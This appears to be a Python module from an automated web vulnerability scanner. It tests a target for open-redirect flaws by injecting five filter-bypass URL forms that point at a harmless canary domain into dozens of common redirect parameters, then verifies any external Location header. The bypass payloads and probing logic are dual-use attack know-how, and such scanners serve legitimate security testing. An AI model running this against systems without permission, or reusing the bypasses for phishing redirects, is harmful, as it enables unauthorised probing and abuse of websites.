"""open_redirect v2 — baseline + verify + many bypass forms"""
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.http import HttpClient
from core.verify import verify, confidence, is_signal
from core.waf_bypass import mutate_until_pass

# canary-домен, которого нет в природе
CANARY = "omni-open-redirect-canary.example"
CANARY_HOST = CANARY

# payload-формы: разные обходы фильтров "должно быть внутренним URL"
# приоритетные payload-формы: 5 самых частых bypass'ов (вместо 15)
PAYLOAD_FORMS = [
    f"https://{CANARY}/",                 # чистый внешний
    f"//{CANARY}/",                       # protocol-relative
    f"https:\\{CANARY}/",                # backslash (nginx/apache)
    f"https://{CANARY}@trusted.example/", # userinfo trick
    f"https:%2f%2f{CANARY}/",             # fully encoded
]

PARAMS = [
    "next","url","redirect","redirect_uri","redirect_url","return","return_to","return_url",
    "continue","continue_url","dest","destination","r","u","goto","target","link","out",
    "callback","callback_url","forward","forward_url","redir","redirect_to","back","backurl",
    "referer","referrer","returnUrl","return_url","go","jump","view","ref",
]


def _is_external_redirect(location, canary_host):
    """
    Редирект считается открытым, если Location ведёт на canary_host.
    Отсеивает случаи когда Location просто упоминает canary в query/fragment,
    но реально ведёт на свой домен.
    """
    if not location:
        return False

    loc = location.strip()
    loc_low = loc.lower()

    # канонический парсинг — если можем распарсить как абсолютный URL
    try:
        p = urlparse(loc)
        if p.netloc:
            host = p.netloc.split("@")[-1].split(":")[0].lower()
            # host == canary или заканчивается на .canary
            if host == canary_host or host.endswith("." + canary_host):
                return True
    except Exception:
        pass

    # protocol-relative //canary/
    if loc_low.startswith("//") and canary_host in loc_low.split("/", 3)[2].lower():
        return True

    # обфусцированные формы
    for prefix in (f"//{canary_host}", f"\\\\{canary_host}", f"\\\\{canary_host}"):
        if prefix.lower() in loc_low:
            # убедимся что это начало или сразу после схемы
            idx = loc_low.find(prefix.lower())
            if idx <= 8:  # "https:/" максимум
                return True

    return False


class OpenRedirect:
    def run(self, session, logger):
        target = session.target
        http = HttpClient(session, logger)
        u = urlparse(target)
        base_q = parse_qs(u.query)

        # baseline: как выглядит стандартное поведение при redirect-параметре
        # но с внутренним URL — для выявления "всегда редиректит" сайтов
        try:
            baseline_q = dict(base_q)
            baseline_q["omni_noise_param"] = "1"
            baseline_url = urlunparse(u._replace(query=urlencode(baseline_q, doseq=True)))
            base_r = http.get(baseline_url, allow_redirects=False)
            baseline_status = base_r.status_code if base_r else 0
            baseline_location = (base_r.headers.get("Location", "") if base_r else "")
        except Exception:
            baseline_status = 0
            baseline_location = ""

        print(f"[open_redirect v2] target: {target}")
        print(f"[open_redirect v2] baseline: {baseline_status} loc={baseline_location[:60]}")

        findings = []

        for name in PARAMS:
            for payload in PAYLOAD_FORMS:
                q = dict(base_q)
                q[name] = [payload]
                new_url = urlunparse(u._replace(query=urlencode(q, doseq=True)))
                try:
                    r = http.get(new_url, allow_redirects=False)
                except Exception:
                    continue
                if not r:
                    continue

                loc = r.headers.get("Location", "")
                status = r.status_code

                # сигнал: 3xx с Location ведущим на canary
                if status not in (301, 302, 303, 307, 308):
                    continue
                if not _is_external_redirect(loc, CANARY_HOST):
                    continue

                # отсеиваем baseline-эффект: если и без payload редиректит на canary — странно, но пропустим
                if CANARY_HOST in baseline_location.lower():
                    continue

                # verify ×2: тот же payload должен дать тот же Location
                def rep():
                    try:
                        return http.get(new_url, allow_redirects=False)
                    except Exception:
                        return None

                def predicate(s):
                    return s["status"] in (301, 302, 303, 307, 308) and _is_external_redirect(
                        s.get("headers", {}).get("Location", ""), CANARY_HOST
                    )

                ratio, hits = verify(rep, predicate, n=2, delay=0.2)

                # confidence: 3xx + Location → canary, verify ×2
                conf = confidence(
                    signal_strength=0.85,  # очень сильный сигнал — реальный редирект
                    verify_ratio=ratio,
                    baseline=None,
                    sample=None,
                )
                if not is_signal(conf, floor=0.55, module="open_redirect"):
                    continue

                findings.append({
                    "param": name,
                    "payload": payload,
                    "location": loc[:200],
                    "status": status,
                    "verify_hits": hits,
                    "confidence": conf,
                })
                print(f"  ✓ open redirect: {name} ({payload[:40]}) -> {loc[:80]}")
                logger.finding(
                    "open_redirect", "medium",
                    f"{name}={payload[:40]} -> {loc[:80]} conf={int(conf*100)}"
                )
                break  # одного payload'а для параметра достаточно

        print(f"[open_redirect v2] findings: {len(findings)}")
        return {"findings": findings}
